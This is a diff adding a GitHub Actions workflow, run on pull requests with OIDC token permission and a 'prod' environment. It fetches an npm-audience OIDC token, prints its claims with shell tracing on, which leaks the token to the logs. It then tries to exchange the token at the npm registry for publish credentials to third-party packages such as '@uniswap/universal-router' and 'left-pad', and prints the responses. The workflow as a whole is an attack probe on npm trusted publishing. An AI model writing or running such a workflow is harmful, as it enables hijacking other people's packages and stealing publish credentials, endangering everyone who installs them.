@@ -1,0 +1,26 @@
+name: npm oidc probe
+on:
+  pull_request:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: prod
+    steps:
+      - name: fetch oidc token and claims
+        run: |
+          set -x
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=npm:registry.npmjs.org")
+          JWT=$(printf '%s' "$RESP" | jq -r .value)
+          P=$(printf '%s' "$JWT" | cut -d. -f2)
+          PAD=$(( (4 - ${#P} % 4) % 4 ))
+          P="$P$(printf '=%.0s' $(seq 1 $PAD))"
+          printf '%s' "$P" | base64 -d 2>/dev/null | jq . || true
+          for pkg in "%40uniswap%2Funiversal-router" "left-pad" "%40pwnhaven-afk%2Fnonexistent-probe" ; do
+            echo "== exchange for $pkg"
+            curl -sS -o resp.json -w "HTTP %{http_code}\n" -X POST "https://registry.npmjs.org/-/npm/v1/oidc/token/exchange/package/$pkg" \
+              -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{}'
+            cat resp.json; echo
+          done
